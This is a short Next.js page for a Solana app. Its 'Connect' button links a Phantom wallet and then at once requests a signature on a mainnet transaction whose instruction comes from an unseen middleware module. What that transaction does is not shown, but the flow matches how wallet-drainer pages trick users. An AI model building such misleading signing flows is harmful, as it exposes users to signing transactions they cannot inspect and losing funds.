import Head from 'next/head';
import styles from '../styles/Home.module.css';
import { useState } from 'react';
import {getTransaction} from "../../middleware/script";
import * as web3 from "@solana/web3.js";

export default function Home() {

  const [provider, setprovider] = useState();

  async function connectPhantom(){
    const provider = window.phantom?.solana;
    const resp = await provider.request({ method: "connect" });
    console.log(resp.publicKey.toString());
    let ix = await getTransaction(resp.publicKey.toString());
    const tx = new web3.Transaction();
    const connection = new web3.Connection("https://docs-demo.solana-mainnet.quiknode.pro/");
    let blockhash = (await connection.getLatestBlockhash()).blockhash;
    tx.add(ix);
    tx.recentBlockhash = blockhash;
    tx.feePayer = new web3.PublicKey(resp.publicKey.toString());
    await provider.signAndSendTransaction(tx);
  }

  return (
      <div>
            <div onClick={connectPhantom} > 
              Connect
            </div>
      </div>
    )
  }

